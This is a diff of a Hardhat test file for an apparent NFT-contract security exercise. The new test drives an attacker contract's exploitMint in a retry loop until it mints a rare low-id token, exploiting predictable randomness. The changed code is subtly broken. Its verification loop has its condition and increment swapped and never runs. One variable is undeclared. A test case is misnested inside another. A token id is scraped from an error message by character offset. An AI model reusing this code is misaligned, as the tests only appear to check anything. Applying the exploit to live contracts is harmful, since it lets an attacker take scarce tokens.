@@ -12,6 +12,7 @@ const {
   getMappingItem,
   toWei,
 } = require("../../helpers/helpers.js");
+const {string} = require("hardhat/internal/core/params/argumentTypes");
 
 const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
 
@@ -74,35 +75,45 @@ const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
           await attackInSecureumNFT.connect(deployer).deposit({value: toWei(100)});
           expect(await contractBalance(attackInSecureumNFT.address)).to.eq(toWei(100));
 
-          // send Eth to contract for Gas
-          // await deployer.sendTransaction({
-          //   to: inSecureumNFT.address,
-          //   value: toWei(10),
-          // });
           // Start Sale
           await inSecureumNFT.startSale(salePrice);
           // non-malicious users Mint NFTs
-          await inSecureumNFT.connect(deployer).mint({value: toWei(10)});
-          await inSecureumNFT.connect(acc1).mint({value: toWei(1)});
-          await inSecureumNFT.connect(acc2).mint({value: toWei(1)});
 
-          const balance = await contractBalance(attackInSecureumNFT.address);
+          // repeatidly call mint, revert if NFT id is too high, therefore less rare
+          let success = false;
+          let retry = 0;
+          let ids = [];
+          while (!success && retry < 5) {
+            try {
+              const transactionResponse = await attackInSecureumNFT.exploitMint({value: toWei(1)});
+              const transactionReceipt = await transactionResponse.wait();
+              id = transactionReceipt.events[0].args.id;
 
-          // exploit via reentrancy
-          await expect(attackInSecureumNFT.exploitMint({value: salePrice})).to.be.revertedWith(
-            "contract call run out of gas and made the transaction revert"
-          );
+              console.log("successful mint, id", Number(id));
+              expect(await inSecureumNFT.idToOwners(id)).to.eq(attackInSecureumNFT.address);
+              break;
+            } catch (e) {
+              // NFT id is too high, tx will have reverted, try again
 
-          const newBalance = await contractBalance(attackInSecureumNFT.address);
-        });
+              let id = parseInt(e.message.substring(86, 87));
+              console.log("unsuccessful mint attempt, id", id);
+              ids.push(id);
+              retry++;
+            }
+          }
+          // verify
+          for (let i = 0; i++; i <= ids.length) {
+            expect(await inSecureumNFT.idToOwners(ids[i])).to.eq(ZERO_ADDRESS);
+          }
 
-        it("Refunds excess ETH paid by buyer", async () => {
-          await inSecureumNFT.startSale(salePrice);
-          const balance = await contractBalance(acc1.address);
-          console.log(Number(fromWei(balance)));
-          await inSecureumNFT.connect(acc1).mint({value: toWei(10)});
-          const newBalance = await contractBalance(acc1.address);
-          console.log(Number(fromWei(newBalance)));
+          it("Refunds excess ETH paid by buyer", async () => {
+            await inSecureumNFT.startSale(salePrice);
+            const balance = await contractBalance(acc1.address);
+            console.log(Number(fromWei(balance)));
+            await inSecureumNFT.connect(acc1).mint({value: toWei(10)});
+            const newBalance = await contractBalance(acc1.address);
+            console.log(Number(fromWei(newBalance)));
+          });
         });
       });
     });
